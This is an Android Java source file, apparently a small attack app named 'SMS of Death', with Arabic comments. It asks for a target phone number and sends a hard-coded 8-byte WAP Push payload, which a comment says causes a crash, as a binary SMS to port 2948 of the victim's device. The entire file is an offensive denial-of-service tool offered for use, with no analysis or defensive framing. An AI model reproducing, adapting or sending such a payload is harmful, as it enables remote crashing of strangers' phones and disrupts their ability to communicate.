package com.example.smsofdeath;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // تصميم بسيط لواجهة الأداة
        Button sendBtn = new Button(this);
        sendBtn.setText("Send SMS of Death");
        final EditText phoneInput = new EditText(this);
        phoneInput.setHint("Enter Target Phone Number");

        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.addView(phoneInput);
        layout.addView(sendBtn);
        setContentView(layout);

        sendBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String phone = phoneInput.getText().toString();
                if(!phone.isEmpty()) {
                    sendWapPush(phone);
                } else {
                    Toast.makeText(MainActivity.this, "Enter number!", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private void sendWapPush(String phoneNumber) {
        try {
            // حمولة WAP Push PDU المسببة للانهيار (8 بايت)
            byte[] pdu = new byte[] {0x01, 0x06, (byte)0x88, (byte)0x80, (byte)0x80, (byte)0x80, 0x00, (byte)0xBE};
            
            SmsManager smsManager = SmsManager.getDefault();
            // الإرسال عبر البورت 2948 المستهدف للـ WAP Push
            smsManager.sendDataMessage(phoneNumber, null, (short) 2948, pdu, null, null);
            Toast.makeText(this, "Payload Sent!", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
